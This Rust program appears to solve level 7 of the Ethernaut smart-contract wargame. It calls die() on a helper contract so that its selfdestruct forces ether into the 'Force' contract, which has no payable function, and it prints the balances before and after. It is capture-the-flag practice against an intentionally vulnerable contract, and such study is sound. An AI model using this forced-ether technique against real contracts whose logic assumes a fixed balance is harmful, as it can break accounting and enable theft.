#[allow(unused_imports)]
use alloy::{
    network::{TransactionBuilder, EthereumWallet},
    primitives::{
        address,
        Address,
        utils::{format_ether, Unit},
        U256,
        Bytes,
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    #[sol(rpc)]
    contract TempContract {
        function die(address payable target) public;
    }
}

use crate::{ethernaut, utils};

use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level07_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level07())?;
    
    Ok(())
}

async fn level07() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;
    
    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);
    
    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;
    
    let temp_address = "0xBcf5277C477213787dEBbf7968F3e4BC11c2B2B9".parse()?;
    let temp = TempContract::new(temp_address, provider.clone());
    let force_address = "0xf290f98622E752341dB37525Bf762e525bdD5468".parse()?;
    
    println!("[CHECK]");
    let temp_balance = utils::balance(temp_address).await?;
    println!("temp's balance = {temp_balance}");
    let force_balance = utils::balance(force_address).await?;
    println!("force's balance = {force_balance}\n");
    
    let die_tx = temp
        .die(force_address)
        .send()
        .await?;
    println!("[TempContract.die()]    Panding transaction... {}", die_tx.tx_hash());
    
    let die_receipt = die_tx
        .get_receipt()
        .await?;
    println!(
        "[TempContract.die()]    transaction included in block {}\n",
        die_receipt.block_number.expect("Failed to get block number")
    );
    
    println!("[CHECK]");
    let temp_balance = utils::balance(temp_address).await?;
    println!("temp's balance = {temp_balance}");
    let force_balance = utils::balance(force_address).await?;
    println!("force's balance = {force_balance}\n");
    
    Ok(())
}

// Force = 0xf290f98622E752341dB37525Bf762e525bdD5468
// TempContract = 0xBcf5277C477213787dEBbf7968F3e4BC11c2B2B9